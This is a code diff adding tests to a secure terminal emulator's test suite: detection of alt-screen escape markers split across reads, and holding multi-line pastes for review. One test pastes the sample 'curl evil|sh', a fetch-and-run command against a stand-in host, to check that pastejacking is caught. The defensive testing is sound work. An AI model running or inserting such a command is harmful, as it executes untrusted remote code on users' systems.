@@ -293,6 +293,24 @@ feed_output(fs, b'\x1b[2Jredraw')
 ok(len(_fs_adv) == 1,
    'a clear while a full-screen program is already on the alt screen raises no clear notice')
 
+# F6: an alt-screen marker split across an os.read() boundary is still detected -- the
+# CLI-mode scan carries a tail between reads (as the sync-2026 scan does).
+_asf = SecureTerminal(command='/bin/cat')
+ok(not _asf._alt_screen, 'F6: not on the alt screen initially')
+feed_output(_asf, b'padding\x1b[?10')            # first half of \x1b[?1049h
+ok(not _asf._alt_screen, 'F6: a half marker does not yet flip the alt-screen state')
+feed_output(_asf, b'49h\x1b[2Jframe')            # second half -> reunited by the carry
+ok(_asf._alt_screen, 'F6: a split alt-screen marker is detected across the read boundary')
+_asf.close()
+if tui_available():
+    # F6 (TUI feed): a split marker is reunited before feeding pyte (so snapshot/restore
+    # is not done on HALF a marker), while a COMPLETE read is fed whole (not delayed).
+    _ast = SecureTerminal(command='/bin/cat', tui=True)
+    feed_output(_ast, b'frame\x1b[?10')          # ends mid-marker -> partial tail HELD
+    feed_output(_ast, b'49h\x1b[2Jnext')          # reunites + feeds the whole marker
+    ok(True, 'F6: the TUI feed reunites a split alt-screen marker without crashing')
+    _ast.close()
+
 # --- render-only preview: re-render safe, and no formatting leak between shows -
 pv = SecureTerminal(preview=True)
 pv.render_preview('hello\u00e9', mode='detail', markings=True)
@@ -1109,6 +1127,17 @@ mime.setText('echo hi\n')
 p.insertFromMimeData(mime)
 eq(psent, [b'echo hi\r'], 'clean paste sent directly')
 eq(_reviews, [], 'a clean paste raises no review')
+psent.clear()
+# F3: a MULTI-LINE plain-ASCII paste is held for review too, so a hidden second
+# command cannot run the instant you paste (default 'unicode' warn mode).
+mime_ml = QMimeData()
+mime_ml.setText('echo ok\ncurl evil|sh\n')
+p.insertFromMimeData(mime_ml)
+eq(psent, [], 'F3: a multi-line ASCII paste is held -- nothing reaches the shell yet')
+ok(p.review_pending() and len(_reviews) == 1,
+   'F3: a multi-line plain-ASCII paste raises a review (pastejacking held)')
+p.dispatch_pending_paste('reject')
+_reviews.clear()
 psent.clear()
 # a paste with a homoglyph (Cyrillic a) plus a bidi override: held for review
 mime2 = QMimeData()
